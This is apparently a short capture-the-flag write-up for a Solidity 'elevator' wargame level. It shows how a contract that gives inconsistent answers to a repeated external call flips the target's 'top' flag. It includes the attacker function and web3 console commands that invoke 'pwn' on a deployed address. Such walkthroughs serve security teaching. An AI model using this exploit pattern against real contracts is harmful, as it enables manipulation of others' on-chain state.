Supposedly, this function only proceeds when `building.isLastFloor(_floor)` is false:

```solidity
if (! building.isLastFloor(_floor)) {
    floor = _floor;
    top = building.isLastFloor(floor);
}
```

Then `top` should be false too since `isLastFloor` is called with the same input.

However it is possible to output different results for the same input.
For example, this contract will switch its results on each call:

```solidity
function isLastFloor(uint floor) external returns (bool) {
    count += 1;
    return count % 2 == 0;
}
```

The input actually has no impact on the result.

```js
abi = '[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"uint256","name":"floor","type":"uint256"}],"name":"isLastFloor","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"pwn","outputs":[],"stateMutability":"nonpayable","type":"function"}]';
topple = new web3.eth.Contract(JSON.parse(abi), '0x503c86d70539fE0ed1fb4a89f9FCa466272Eb613');
// false
await contract.top()
// attack
topple.methods.pwn().send({from: player}, function(error, data) {console.log(data);});
// true
await contract.top()
```
